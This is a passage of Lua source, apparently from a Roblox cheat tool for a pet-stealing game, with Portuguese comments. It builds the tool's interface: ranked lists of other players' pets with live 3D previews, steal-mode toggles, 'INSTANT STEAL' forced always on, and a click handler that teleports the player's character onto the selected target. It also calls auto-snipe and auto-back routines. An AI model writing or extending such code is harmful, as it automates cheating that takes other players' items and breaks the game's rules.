                    if forceLiveModelOnly then

                        local targetPart = findAdorneeGlobal(ad)

                        if targetPart and targetPart:IsA("BasePart") then

                            srcPart = targetPart

                        elseif spawnPart then

                            srcPart = spawnPart

                        end

                    else

                        local bestModel, bestScore = nil, -math.huge

                        for _, d in ipairs(plot:GetDescendants()) do

                            if d:IsA("Model") and d ~= plot and d.Name ~= "Base" then

                                local pp = d.PrimaryPart or d:FindFirstChildWhichIsA("BasePart")

                                if pp then

                                    local nameL = d.Name:lower()

                                    local score = 0

                                    if petNameNorm ~= "" and (nameL:find(petNameNorm, 1, true) or petNameNorm:find(nameL, 1, true)) then

                                        score = score + 200

                                    end

                                    if slotNorm ~= "" and nameL:find(slotNorm, 1, true) then

                                        score = score + 100

                                    end

                                    if nameL:find("podium", 1, true) or nameL:find("base", 1, true) then

                                        score = score - 120

                                    end

                                    if spawnPart then

                                        local dist = (pp.Position - spawnPart.Position).Magnitude

                                        score = score - dist

                                    end

                                    if score > bestScore then

                                        bestScore = score

                                        bestModel = d

                                    end

                                end

                            end

                        end

                        srcModel = bestModel

                        if not srcModel and spawnPart then

                            srcPart = spawnPart

                        end

                    end

                end

            end

        end

        if (not srcModel) and (not forceLiveModelOnly) and petNameNorm ~= "" then

            local plots = Workspace:FindFirstChild("Plots")

            if plots then

                local bestModel, bestScore = nil, -math.huge

                for _, plot in ipairs(plots:GetChildren()) do

                    for _, d in ipairs(plot:GetDescendants()) do

                        if d:IsA("Model") and d ~= plot and d.Name ~= "Base" then

                            local pp = d.PrimaryPart or d:FindFirstChildWhichIsA("BasePart")

                            if pp then

                                local nameL = d.Name:lower()

                                if nameL:find("podium", 1, true) or nameL:find("base", 1, true) or nameL:find("plotsign", 1, true) then

                                    continue

                                end

                                local score = 0

                                if nameL == petNameNorm then

                                    score = score + 320

                                elseif nameL:find(petNameNorm, 1, true) or petNameNorm:find(nameL, 1, true) then

                                    score = score + 220

                                end

                                if slotNorm ~= "" and nameL:find(slotNorm, 1, true) then

                                    score = score + 60

                                end

                                if score > bestScore then

                                    bestScore = score

                                    bestModel = d

                                end

                            end

                        end

                    end

                end

                if bestModel then

                    srcModel = bestModel

                end

            end

        end

        -- srcModel é apenas o driver de animação (não substitui previewObj)

        -- Se não tiver templateModel (RS), usa live model como fallback visual

        if not previewObj then

            if srcModel and srcModel.Archivable then

                local ok, clonedLive = pcall(function() return srcModel:Clone() end)

                if ok and clonedLive then

                    previewObj = clonedLive

                    previewFromCache = false

                    previewFromLiveModel = true

                end

            elseif srcPart and srcPart.Archivable then

                local ok, clonedPart = pcall(function() return srcPart:Clone() end)

                if ok and clonedPart then

                    previewObj = clonedPart

                    previewFromCache = false

                end

            end

        end

        if not previewObj then return holder end

        failLbl.Visible = false

        -- WorldModel é necessário para AnimationController + Bone funcionarem no ViewportFrame

        local worldModel = Instance.new("WorldModel", vp)

        previewObj.Parent = worldModel

        for _, d in ipairs(previewObj:GetDescendants()) do

            if d:IsA("BasePart") then

                d.Massless = true

                d.CanCollide = false

                -- Para RS template: partes desancoradas para o WorldModel mover via animação

                -- Para live model como visual: ancoramos e copiamos CFrame

                if previewFromLiveModel then

                    d.Anchored = true

                else

                    d.Anchored = false

                end

            end

        end

        -- Posicionar o modelo no origin do WorldModel para a câmera enquadrar corretamente

        if not previewFromLiveModel and previewObj:IsA("Model") then

            pcall(function()

                local cf, sz = previewObj:GetBoundingBox()

                if cf then

                    local offset = cf.Position

                    previewObj:PivotTo(CFrame.new(-offset.X, -offset.Y, -offset.Z) * cf.Rotation)

                end

            end)

        end

        -- Detectar tipo de rig

        local hasAnimController = previewObj:IsA("Model") and previewObj:FindFirstChildOfClass("AnimationController") ~= nil

        local hasMotor6D = false

        if previewObj:IsA("Model") then

            for _, d in ipairs(previewObj:GetDescendants()) do

                if d:IsA("Motor6D") then hasMotor6D = true; break end

            end

        end

        local isBoneBased = hasAnimController and not hasMotor6D

        -- Busca animador vivo em qualquer plot pelo petName (para pegar IDs das tracks)

        local function findLiveAnimatorByName()

            local plots = Workspace:FindFirstChild("Plots")

            if not plots or petNameNorm == "" then return nil end

            for _, plot in ipairs(plots:GetChildren()) do

                for _, d in ipairs(plot:GetDescendants()) do

                    if d:IsA("Model") then

                        local nl = d.Name:lower()

                        if nl == petNameNorm

                            or nl:find(petNameNorm, 1, true)

                            or (petNameNorm ~= "" and petNameNorm:find(nl, 1, true)) then

                            local a = getAnimatorFrom(d)

                            if a and #a:GetPlayingAnimationTracks() > 0 then

                                return a

                            end

                        end

                    end

                end

            end

            return nil

        end

        local embeddedAnimPlaying = false

        if previewObj:IsA("Model") then

            if forceEmbeddedAnimation then

                embeddedAnimPlaying = playEmbeddedPreviewAnimations(previewObj)

            elseif isBoneBased then

                -- Bone-based: RS template não tem Animation objects embutidos.

                -- Busca o animador vivo e usa os IDs das tracks dele.

                local liveAnim = (srcModel and getAnimatorFrom(srcModel)) or findLiveAnimatorByName()

                if liveAnim then

                    local dstAnim = ensureAnimatorForPreviewModel(previewObj) or getAnimatorFrom(previewObj)

                    if dstAnim then

                        local dstTracksById = {}

                        -- Carregar imediatamente as tracks que estão tocando

                        task.defer(function()

                            if not holder.Parent then return end

                            local srcTracks = liveAnim:GetPlayingAnimationTracks()

                            for _, st in ipairs(srcTracks) do

                                local anim = st.Animation

                                local animId = anim and anim.AnimationId

                                if animId and animId ~= "" and not dstTracksById[animId] then

                                    local okL, track = pcall(function() return dstAnim:LoadAnimation(anim) end)

                                    if okL and track then

                                        dstTracksById[animId] = track

                                        pcall(function() track.Looped = true; track:Play(0, 1, 1) end)

                                    end

                                end

                            end

                        end)

                        -- Manter sincronizado quando tracks mudam

                        animSyncConn = RunService.Heartbeat:Connect(function()

                            if not holder.Parent then

                                if animSyncConn then animSyncConn:Disconnect() end

                                return

                            end

                            local srcTracks = liveAnim:GetPlayingAnimationTracks()

                            local activeIds = {}

                            for _, st in ipairs(srcTracks) do

                                local anim = st.Animation

                                local animId = anim and anim.AnimationId

                                if animId and animId ~= "" then

                                    activeIds[animId] = true

                                    if not dstTracksById[animId] then

                                        local okL, track = pcall(function() return dstAnim:LoadAnimation(anim) end)

                                        if okL and track then

                                            dstTracksById[animId] = track

                                            pcall(function() track.Looped = true; track:Play(0, 1, 1) end)

                                        end

                                    end

                                end

                            end

                            for animId, track in pairs(dstTracksById) do

                                if not activeIds[animId] then

                                    pcall(function() track:Stop(0.2) end)

                                    dstTracksById[animId] = nil

                                end

                            end

                            refreshPreviewCamera()

                        end)

                        embeddedAnimPlaying = true

                    end

                else

                    -- Sem live model: tenta embedded como último recurso

                    embeddedAnimPlaying = playEmbeddedPreviewAnimations(previewObj)

                end

            elseif not srcModel then

                embeddedAnimPlaying = playEmbeddedPreviewAnimations(previewObj)

            end

        end

        if not previewFromCache and cacheKey ~= "" and previewObj:IsA("Model") and previewObj.Archivable then

            pcall(function()

                local old = SharedState.PetPreviewModelCache[cacheKey]

                local tmpl = previewObj:Clone()

                tmpl.Parent = nil

                SharedState.PetPreviewModelCache[cacheKey] = tmpl

                if old and old ~= tmpl and old.Parent == nil then

                    pcall(function() old:Destroy() end)

                end

            end)

        end

        local function relPath(obj, root)

            local parts = {}

            local cur = obj

            while cur and cur ~= root do

                table.insert(parts, 1, cur.Name)

                cur = cur.Parent

            end

            return table.concat(parts, "/")

        end

        local syncConn = nil

        local animSyncConn = nil

        local cam = nil

        local function refreshPreviewCamera()

            if not cam or not previewObj or not previewObj.Parent then return end

            local center, size

            if previewObj:IsA("Model") then

                local ok, cf, sz = pcall(function() return previewObj:GetBoundingBox() end)

                if ok then

                    center = cf.Position

                    size = sz

                else

                    local okPivot, piv = pcall(function() return previewObj:GetPivot() end)

                    local okSize, ext = pcall(function() return previewObj:GetExtentsSize() end)

                    if okPivot then center = piv.Position end

                    if okSize then size = ext end

                end

            elseif previewObj:IsA("BasePart") then

                center = previewObj.Position

                size = previewObj.Size

            end

            if not center or not size then return end

            local maxDim = math.max(size.X, size.Y, size.Z)

            local halfFov = math.rad(cam.FieldOfView * 0.5)

            local fitDist = (maxDim * 0.62) / math.tan(halfFov)

            local dist = math.max(fitDist, maxDim * 1.15)

            local lookAt = center

            local camPos = lookAt + Vector3.new(dist * 0.58, maxDim * 0.08, dist * 0.58)

            cam.CFrame = CFrame.new(camPos, lookAt)

        end

        if srcModel and previewObj:IsA("Model") then

            local srcPartMap, srcBoneMap, srcMotorMap = {}, {}, {}

            local srcPartByName, srcBoneByName, srcMotorByName = {}, {}, {}

            for _, d in ipairs(srcModel:GetDescendants()) do

                if d:IsA("BasePart") then

                    srcPartMap[relPath(d, srcModel)] = d

                    srcPartByName[d.Name] = srcPartByName[d.Name] or d

                elseif d:IsA("Bone") then

                    srcBoneMap[relPath(d, srcModel)] = d

                    srcBoneByName[d.Name] = srcBoneByName[d.Name] or d

                elseif d:IsA("Motor6D") then

                    srcMotorMap[relPath(d, srcModel)] = d

                    srcMotorByName[d.Name] = srcMotorByName[d.Name] or d

                end

            end

            local partPairs, bonePairs, motorPairs = {}, {}, {}

            for _, d in ipairs(previewObj:GetDescendants()) do

                if d:IsA("BasePart") then

                    local src = srcPartMap[relPath(d, previewObj)] or srcPartByName[d.Name]

                    if src then

                        table.insert(partPairs, {src = src, dst = d})

                    end

                elseif d:IsA("Bone") then

                    local src = srcBoneMap[relPath(d, previewObj)] or srcBoneByName[d.Name]

                    if src then

                        table.insert(bonePairs, {src = src, dst = d})

                    end

                elseif d:IsA("Motor6D") then

                    local src = srcMotorMap[relPath(d, previewObj)] or srcMotorByName[d.Name]

                    if src then

                        table.insert(motorPairs, {src = src, dst = d})

                    end

                end

            end

            if not preferFallbackModelOnly then

                syncConn = RunService.RenderStepped:Connect(function()

                    if not holder.Parent or not srcModel.Parent then

                        if syncConn then syncConn:Disconnect() end

                        return

                    end

                    -- Quando usando RS template (previewFromLiveModel=false),

                    -- NÃO copiar CFrame mundial (jogaria as partes para as coords do jogo).

                    -- Apenas Motor6D.Transform e Bone.Transform (rotações relativas).

                    if previewFromLiveModel then

                        for _, p in ipairs(partPairs) do

                            if p.src.Parent and p.dst.Parent then

                                p.dst.CFrame = p.src.CFrame

                            end

                        end

                    end

                    for _, b in ipairs(bonePairs) do

                        if b.src.Parent and b.dst.Parent then

                            b.dst.Transform = b.src.Transform

                        end

                    end

                    for _, m in ipairs(motorPairs) do

                        if m.src.Parent and m.dst.Parent then

                            m.dst.Transform = m.src.Transform

                            -- C0/C1 só quando live model é o visual (mesmo rig)

                            if previewFromLiveModel then

                                m.dst.C0 = m.src.C0

                                m.dst.C1 = m.src.C1

                            end

                        end

                    end

                    refreshPreviewCamera()

                end)

            end

            local srcAnimator = getAnimatorFrom(srcModel)

            local dstAnimator = ensureAnimatorForPreviewModel(previewObj) or getAnimatorFrom(previewObj)

            -- Não sobrescrever animSyncConn já definido para bone-based

            if srcAnimator and dstAnimator and not animSyncConn then

                local dstTracksById = {}

                animSyncConn = RunService.Heartbeat:Connect(function()

                    if not holder.Parent or not srcAnimator.Parent or not dstAnimator.Parent then

                        if animSyncConn then animSyncConn:Disconnect() end

                        return

                    end

                    local srcTracks = srcAnimator:GetPlayingAnimationTracks()

                    local activeIds = {}

                    for _, st in ipairs(srcTracks) do

                        local anim = st.Animation

                        local animId = anim and anim.AnimationId

                        if animId and animId ~= "" then

                            activeIds[animId] = true

                            local dt = dstTracksById[animId]

                            if (not dt) or (not dt.IsPlaying) then

                                local okLoad, loaded = pcall(function() return dstAnimator:LoadAnimation(anim) end)

                                if okLoad and loaded then

                                    dstTracksById[animId] = loaded

                                    dt = loaded

                                    pcall(function() dt:Play(0.1, st.WeightCurrent, math.max(st.Speed, 0.01)) end)

                                end

                            end

                            if dt then

                                pcall(function()

                                    dt:AdjustSpeed(math.max(st.Speed, 0.01))

                                    dt.TimePosition = st.TimePosition

                                end)

                            end

                        end

                    end

                    for animId, dt in pairs(dstTracksById) do

                        if not activeIds[animId] then

                            pcall(function() dt:Stop(0.1) end)

                            dstTracksById[animId] = nil

                        end

                    end

                    refreshPreviewCamera()

                end)

            end

        elseif embeddedAnimPlaying and not animSyncConn then

            animSyncConn = RunService.RenderStepped:Connect(function()

                if not holder.Parent or not previewObj.Parent then

                    if animSyncConn then animSyncConn:Disconnect() end

                    return

                end

                refreshPreviewCamera()

            end)

        elseif srcPart and previewObj:IsA("BasePart") then

            syncConn = RunService.RenderStepped:Connect(function()

                if not holder.Parent or not srcPart.Parent or not previewObj.Parent then

                    if syncConn then syncConn:Disconnect() end

                    return

                end

                previewObj.CFrame = srcPart.CFrame

                refreshPreviewCamera()

            end)

        end

        holder.Destroying:Connect(function()

            if syncConn then syncConn:Disconnect() end

            if animSyncConn then animSyncConn:Disconnect() end

        end)

        cam = Instance.new("Camera")

        cam.Parent = vp

        vp.CurrentCamera = cam

        cam.FieldOfView = layoutOpts.Fov or 28

        refreshPreviewCamera()

        return holder

    end

    _G.XiAttachPet3DPreview = attachPet3DPreview

    local function updateUI(enabled, allPets)

        autoStealEnabled = true

        instantStealEnabled = true -- Force always ON (lefa9)

        enableBtn.Text = "ENABLED"

        enableBtn.BackgroundColor3 = autoStealEnabled and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(14,14,20)

        listFrame.ScrollBarThickness = 0

        listFrame.ScrollingEnabled = true

        -- Keep list in sync when target pool changes without explicit redraw flag.

        if allPets then

            local needsSync = (#petButtons ~= #allPets)

            if not needsSync then

                for i = 1, #allPets do

                    local pb = petButtons[i]

                    local currentUid = pb and pb.uid

                    if currentUid ~= allPets[i].uid then

                        needsSync = true

                        break

                    end

                end

            end

            if needsSync then

                SharedState.ListNeedsRedraw = true

            end

        end

        

        -- Modo ativo: azul sólido + texto branco / inativo: escuro + cinza
        nearestBtn.BackgroundColor3  = stealNearestEnabled  and Color3.fromRGB(50,110,230) or Color3.fromRGB(18,18,28)
        nearestBtn.BackgroundTransparency = stealNearestEnabled and 0 or 0.2
        nearestBtn.TextColor3        = stealNearestEnabled  and Color3.new(1,1,1) or Color3.fromRGB(120,122,155)

        highestBtn.BackgroundColor3  = stealHighestEnabled  and Color3.fromRGB(50,110,230) or Color3.fromRGB(18,18,28)
        highestBtn.BackgroundTransparency = stealHighestEnabled and 0 or 0.2
        highestBtn.TextColor3        = stealHighestEnabled  and Color3.new(1,1,1) or Color3.fromRGB(120,122,155)

        priorityBtn.BackgroundColor3 = stealPriorityEnabled and Color3.fromRGB(50,110,230) or Color3.fromRGB(18,18,28)
        priorityBtn.BackgroundTransparency = stealPriorityEnabled and 0 or 0.2
        priorityBtn.TextColor3       = stealPriorityEnabled and Color3.new(1,1,1) or Color3.fromRGB(120,122,155)

        if instantStealBtn then

            instantStealBtn.Text = instantStealEnabled and "INSTANT STEAL: ON" or "INSTANT STEAL: OFF"

            instantStealBtn.BackgroundColor3 = instantStealEnabled and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(22,22,35)

            instantStealBtn.TextColor3 = instantStealEnabled and Color3.new(0,0,0) or Color3.fromRGB(185,188,215)

        end

        if selectedTargetUID and allPets then

            local found = false

            for i, p in ipairs(allPets) do

                if p.uid == selectedTargetUID then

                    selectedTargetIndex = i

                    found = true

                    break

                end

            end

        end

        if SharedState.ListNeedsRedraw then

            for _, c in ipairs(listFrame:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end

            petButtons = {}

            if allPets and #allPets > 0 then

                for i = 1, #allPets do

                    local petData = allPets[i]

                    local btn = Instance.new("TextButton")

                    btn.Size = UDim2.new(1,0,0,31); btn.BackgroundTransparency = 1

                    btn.Text = ""; btn.Parent = listFrame

                    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,6)

                    local cardBg = Instance.new("Frame", btn)

                    cardBg.Size = UDim2.new(1, -2, 1, -2)

                    cardBg.Position = UDim2.new(0, 1, 0, 1)

                    cardBg.BackgroundColor3 = Color3.fromRGB(14,14,20)

                    cardBg.BackgroundTransparency = 0.04

                    cardBg.BorderSizePixel = 0

                    cardBg.ZIndex = 1

                    Instance.new("UICorner", cardBg).CornerRadius = UDim.new(0, 6)

                    local rankChip = Instance.new("Frame", btn)

                    rankChip.Size = UDim2.new(0,18,0,18); rankChip.Position = UDim2.new(0,10,0.5,-9)

                    rankChip.BackgroundColor3 = Color3.fromRGB(90, 90, 90)

                    rankChip.BorderSizePixel = 0

                    Instance.new("UICorner", rankChip).CornerRadius = UDim.new(0, 5)

                    local rankLabel = Instance.new("TextLabel", rankChip)

                    rankLabel.Size = UDim2.new(1,0,1,0)

                    rankLabel.BackgroundTransparency = 1; rankLabel.Text = tostring(i)

                    rankLabel.Font = Enum.Font.GothamBlack; rankLabel.TextSize = 9

                    attachPet3DPreview(btn, petData, {

                        ForceLiveModelOnly = true,

                        ForceFallbackModel = false,

                        ForceEmbeddedAnimation = false,

                    })

                    local infoLabel = Instance.new("TextLabel", btn)
                    infoLabel.Size = UDim2.new(1,-124,1,0); infoLabel.Position = UDim2.new(0,58,0,0)
                    infoLabel.BackgroundTransparency = 1; infoLabel.RichText = true
                    infoLabel.Text = formatMutationText(petData.mutation).."<font weight='700'>"..(petData.petName or "No target").."</font>"
                    infoLabel.Font = Enum.Font.GothamBold; infoLabel.TextSize = 11
                    infoLabel.TextColor3 = Color3.fromRGB(210, 213, 235)
                    infoLabel.TextXAlignment = Enum.TextXAlignment.Left; infoLabel.TextTruncate = Enum.TextTruncate.AtEnd

                    local mpsLabel = Instance.new("TextLabel", btn)
                    mpsLabel.Size = UDim2.new(0,66,1,0); mpsLabel.Position = UDim2.new(1,-72,0,0)
                    mpsLabel.BackgroundTransparency = 1
                    mpsLabel.Text = petData.mpsText or "$0/s"
                    mpsLabel.Font = Enum.Font.GothamBold
                    mpsLabel.TextSize = 10
                    mpsLabel.TextColor3 = Color3.fromRGB(80, 140, 255)
                    mpsLabel.TextXAlignment = Enum.TextXAlignment.Right

                    -- Barra lateral de seleção
                    local selBar = Instance.new("Frame", btn)
                    selBar.Name = "SelBar"
                    selBar.Size = UDim2.new(0, 3, 0.7, 0)
                    selBar.Position = UDim2.new(0, 0, 0.15, 0)
                    selBar.BackgroundColor3 = Color3.fromRGB(80, 140, 255)
                    selBar.BackgroundTransparency = 0
                    selBar.BorderSizePixel = 0
                    selBar.Visible = false
                    Instance.new("UICorner", selBar).CornerRadius = UDim.new(0, 2)

                    petButtons[i] = {button=btn, card=cardBg, stroke=bStroke, rank=rankLabel, rankBg=rankChip, info=infoLabel, mps=mpsLabel, uid=petData.uid, selBar=selBar}

                    local function onSelectTarget()

                        selectedTargetIndex = i

                        selectedTargetUID = petData.uid

                        State.manualTargetEnabled = true

                        SharedState.ListNeedsRedraw = false

                        updateUI(autoStealEnabled, get_all_pets())

                        if not (Config.AutoBack and _G.startAutoBack) then

                            pcall(function()

                                if type(_G.isInsideStealHitbox) == "function" and _G.isInsideStealHitbox() then

                                    local ad = petData.animalData

                                    local part = ad and findAdorneeGlobal(ad)

                                    if part then

                                        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

                                        if hrp then hrp.CFrame = CFrame.new(part.Position + Vector3.new(0, 5, 0)) end

                                    end

                                end

                            end)

                        end

                    end

                    local hit = Instance.new("TextButton", btn)

                    hit.Name = "HitArea"

                    hit.Size = UDim2.new(1,0,1,0)

                    hit.Position = UDim2.new(0,0,0,0)

                    hit.BackgroundTransparency = 1

                    hit.BorderSizePixel = 0

                    hit.Text = ""

                    hit.ZIndex = 20

                    hit.AutoButtonColor = false

                    hit.MouseButton1Click:Connect(onSelectTarget)

                end

            end

            SharedState.ListNeedsRedraw = false

        end

        

        if selectedTargetIndex > #petButtons then selectedTargetIndex = 1 end

        for i, pb in ipairs(petButtons) do

            local sel = (i == selectedTargetIndex)

            local rankColor = Color3.fromRGB(90, 90, 90)

            local rankTextColor = Color3.fromRGB(230, 230, 230)

            if i == 1 then

                rankColor = Color3.fromRGB(165, 165, 165)

                rankTextColor = Color3.fromRGB(20, 20, 20)

            elseif i == 2 then

                rankColor = Color3.fromRGB(145, 145, 145)

                rankTextColor = Color3.fromRGB(20, 20, 20)

            elseif i == 3 then

                rankColor = Color3.fromRGB(125, 125, 125)

                rankTextColor = Color3.fromRGB(20, 20, 20)

            end

            if pb.stroke then pb.stroke.Transparency = sel and 0.18 or 0.55 end

            if pb.card then
                -- Selecionado: borda azul + fundo mais claro
                pb.card.BackgroundColor3 = sel and Color3.fromRGB(20, 30, 55) or Color3.fromRGB(14,14,20)
                pb.card.BackgroundTransparency = sel and 0 or 0.04
            end

            -- Indicador de seleção: linha azul à esquerda
            if pb.selBar then
                pb.selBar.Visible = sel
            end

            pb.rankBg.BackgroundColor3 = sel and Color3.fromRGB(80, 140, 255) or rankColor

            pb.rank.TextColor3  = sel and Color3.new(1,1,1) or rankTextColor

            pb.info.TextColor3  = sel and Color3.fromRGB(210,215,240) or Color3.fromRGB(120,122,155)

            if pb.mps then
                pb.mps.TextColor3 = sel and Color3.fromRGB(80, 200, 110) or Color3.fromRGB(120,122,155)
            end

        end

        local ct = allPets and allPets[selectedTargetIndex]

        local prevUID = SharedState.SelectedPetData and SharedState.SelectedPetData.uid

        SharedState.SelectedPetData = ct

        local newUID = ct and ct.uid

        -- ── Lefa AutoTPFollowTarget: TP automático quando pet muda ────────
        if Config.AutoTPFollowTarget and ct and ct.uid ~= State.lastStealTargetUID then
            State.lastStealTargetUID = ct.uid
            task.spawn(function()
                pcall(runAutoSnipe)
            end)
        end

        if Config.AutoBack and _G.startAutoBack and _G.stopAutoBack and newUID ~= prevUID then

            pcall(function()

                local char = LocalPlayer.Character

                local hrp = char and char:FindFirstChild("HumanoidRootPart")

                if hrp then

                    local bp = hrp:FindFirstChild("TP_BodyPosition")

                    if bp then bp:Destroy() end

                end

            end)

            task.spawn(function()

                _G.stopAutoBack()

                task.wait(0.1)

                _G.startAutoBack()

            end)

        end

        listFrame.CanvasSize = UDim2.new(0,0,0, math.max(0, uiListLayout.AbsoluteContentSize.Y))

    end

    

    uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()

        listFrame.CanvasSize = UDim2.new(0,0,0, math.max(0, uiListLayout.AbsoluteContentSize.Y))

    end)

    

    SharedState.UpdateAutoStealUI = function()

        autoStealEnabled = true

        updateUI(true, get_all_pets())

    end

    

    enableBtn.MouseButton1Click:Connect(function()

        autoStealEnabled = true

        SharedState.ListNeedsRedraw = false

        updateUI(true, get_all_pets())

    end)

    

    nearestBtn.MouseButton1Click:Connect(function()

        stealNearestEnabled = not stealNearestEnabled

        if stealNearestEnabled then stealHighestEnabled = false; stealPriorityEnabled = false; State.manualTargetEnabled = false end

        Config.StealNearest = stealNearestEnabled; Config.StealHighest = stealHighestEnabled; Config.StealPriority = stealPriorityEnabled

        SaveConfig()

        SharedState.ListNeedsRedraw = false; updateUI(autoStealEnabled, get_all_pets())

    end)

    highestBtn.MouseButton1Click:Connect(function()

        stealHighestEnabled = not stealHighestEnabled

        if stealHighestEnabled then stealNearestEnabled = false; stealPriorityEnabled = false; State.manualTargetEnabled = false end

        Config.StealNearest = stealNearestEnabled; Config.StealHighest = stealHighestEnabled; Config.StealPriority = stealPriorityEnabled

        SaveConfig()

        SharedState.ListNeedsRedraw = false; updateUI(autoStealEnabled, get_all_pets())

    end)

    priorityBtn.MouseButton1Click:Connect(function()

        stealPriorityEnabled = not stealPriorityEnabled

        if stealPriorityEnabled then stealNearestEnabled = false; stealHighestEnabled = false; State.manualTargetEnabled = false end

        Config.StealNearest = stealNearestEnabled; Config.StealHighest = stealHighestEnabled; Config.StealPriority = stealPriorityEnabled

        SaveConfig()

        SharedState.ListNeedsRedraw = false; updateUI(autoStealEnabled, get_all_pets())

    end)

    -- Expose steal mode state + toggle for the mini bar

    SharedState.GetStealModes = function()

        return stealNearestEnabled, stealHighestEnabled, stealPriorityEnabled

    end

    SharedState.SetStealMode = function(mode)

        if mode == "nearest" then

            stealNearestEnabled = not stealNearestEnabled

            if stealNearestEnabled then stealHighestEnabled = false; stealPriorityEnabled = false; State.manualTargetEnabled = false end

        elseif mode == "highest" then

            stealHighestEnabled = not stealHighestEnabled

            if stealHighestEnabled then stealNearestEnabled = false; stealPriorityEnabled = false; State.manualTargetEnabled = false end

        elseif mode == "priority" then

            stealPriorityEnabled = not stealPriorityEnabled

            if stealPriorityEnabled then stealNearestEnabled = false; stealHighestEnabled = false; State.manualTargetEnabled = false end

        end

        Config.StealNearest = stealNearestEnabled; Config.StealHighest = stealHighestEnabled; Config.StealPriority = stealPriorityEnabled

        SaveConfig()

        SharedState.ListNeedsRedraw = false

        updateUI(autoStealEnabled, get_all_pets())

        if SharedState._refreshMiniModeBar then pcall(SharedState._refreshMiniModeBar) end

    end

    -- ── TARGET UI ───────────────────────────────────────────────────────
    local function syncPos(el, offsetY)
        local function doSync()
            local ap = frame.AbsolutePosition
            local as = frame.AbsoluteSize
            el.Position = UDim2.new(0, ap.X, 0, ap.Y + as.Y + offsetY)
        end
        task.defer(doSync)
        frame:GetPropertyChangedSignal("AbsolutePosition"):Connect(doSync)
        frame:GetPropertyChangedSignal("AbsoluteSize"):Connect(doSync)
        frame:GetPropertyChangedSignal("Visible"):Connect(function() el.Visible = frame.Visible end)
    end

    -- ── CARD 1: Target info ───────────────────────────────────────────────
    local tCard = Instance.new("Frame", screenGui)
    tCard.Name                   = "MiniModeBar"
    tCard.Size                   = UDim2.new(0, 276, 0, 0)
    tCard.AutomaticSize          = Enum.AutomaticSize.Y
    tCard.BackgroundColor3       = Color3.fromRGB(8, 8, 12)
    tCard.BackgroundTransparency = 0.08
    tCard.BorderSizePixel        = 0
    Instance.new("UICorner", tCard).CornerRadius = UDim.new(0, 8)
    syncPos(tCard, 6)

    local tPad = Instance.new("UIPadding", tCard)
    tPad.PaddingLeft   = UDim.new(0, 10)
    tPad.PaddingRight  = UDim.new(0, 10)
    tPad.PaddingTop    = UDim.new(0, 6)
    tPad.PaddingBottom = UDim.new(0, 6)

    local tLayout = Instance.new("UIListLayout", tCard)
    tLayout.FillDirection = Enum.FillDirection.Vertical
    tLayout.Padding       = UDim.new(0, 2)
    tLayout.SortOrder     = Enum.SortOrder.LayoutOrder

    -- Row 1: "TARGET" label + gen value
    local row1 = Instance.new("Frame", tCard)
    row1.Size                  = UDim2.new(1, 0, 0, 13)
    row1.BackgroundTransparency = 1
    row1.LayoutOrder           = 1

    local tLabel = Instance.new("TextLabel", row1)
    tLabel.Size                = UDim2.new(0.5, 0, 1, 0)
    tLabel.BackgroundTransparency = 1
    tLabel.Text                = "TARGET"
    tLabel.Font                = Enum.Font.GothamBold
    tLabel.TextSize            = 8
    tLabel.TextColor3          = Color3.fromRGB(55, 58, 85)
    tLabel.TextXAlignment      = Enum.TextXAlignment.Left

    local genLbl = Instance.new("TextLabel", row1)
    genLbl.Size                = UDim2.new(0.5, 0, 1, 0)
    genLbl.Position            = UDim2.new(0.5, 0, 0, 0)
    genLbl.BackgroundTransparency = 1
    genLbl.Text                = ""
    genLbl.Font                = Enum.Font.GothamBold
    genLbl.TextSize            = 9
    genLbl.TextColor3          = Color3.fromRGB(90, 200, 120)
    genLbl.TextXAlignment      = Enum.TextXAlignment.Right

    -- Row 2: pet name
    local nameLbl = Instance.new("TextLabel", tCard)
    nameLbl.Size               = UDim2.new(1, 0, 0, 18)
    nameLbl.BackgroundTransparency = 1
    nameLbl.Text               = "—"
    nameLbl.Font               = Enum.Font.GothamBlack
    nameLbl.TextSize           = 13
    nameLbl.TextColor3         = Color3.fromRGB(195, 198, 220)
    nameLbl.TextXAlignment     = Enum.TextXAlignment.Left
    nameLbl.TextTruncate       = Enum.TextTruncate.AtEnd
    nameLbl.LayoutOrder        = 2

    -- ── CARD 2: mode selector ─────────────────────────────────────────────
    local mCard = Instance.new("Frame", screenGui)
    mCard.Name                   = "MiniModeCard"
    mCard.Size                   = UDim2.new(0, 276, 0, 28)
    mCard.BackgroundColor3       = Color3.fromRGB(8, 8, 12)
    mCard.BackgroundTransparency = 0.08
    mCard.BorderSizePixel        = 0
    Instance.new("UICorner", mCard).CornerRadius = UDim.new(0, 8)
    syncPos(mCard, 54)

    local mLayout = Instance.new("UIListLayout", mCard)
    mLayout.FillDirection        = Enum.FillDirection.Horizontal
    mLayout.HorizontalAlignment  = Enum.HorizontalAlignment.Center
    mLayout.VerticalAlignment    = Enum.VerticalAlignment.Center
    mLayout.Padding              = UDim.new(0, 2)
    local mPad = Instance.new("UIPadding", mCard)
    mPad.PaddingLeft  = UDim.new(0, 4)
    mPad.PaddingRight = UDim.new(0, 4)

    local function makeBtn(label)
        local b = Instance.new("TextButton", mCard)
        b.Size                   = UDim2.new(0, 86, 0, 22)
        b.BackgroundColor3       = Color3.fromRGB(8, 8, 12)
        b.BackgroundTransparency = 1
        b.Text                   = label
        b.Font                   = Enum.Font.GothamBold
        b.TextSize               = 9
        b.TextColor3             = Color3.fromRGB(55, 58, 85)
        b.BorderSizePixel        = 0
        b.AutoButtonColor        = false
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
        return b
    end

    local miniNearest  = makeBtn("NEAREST")
    local miniHighest  = makeBtn("HIGHEST")
    local miniPriority = makeBtn("PRIORITY")

    local function refreshMiniBar()
        local n, h, p = SharedState.GetStealModes()
        local sel = SharedState.SelectedPetData

        if sel and sel.petName then
            nameLbl.Text       = sel.petName
            nameLbl.TextColor3 = Color3.fromRGB(210, 213, 235)
            genLbl.Text        = sel.mpsText or ""
        else
            nameLbl.Text       = "—"
            nameLbl.TextColor3 = Color3.fromRGB(55, 58, 85)
            genLbl.Text        = ""
        end

        local function styleBtn(btn, on)
            btn.BackgroundTransparency = on and 0.2 or 1
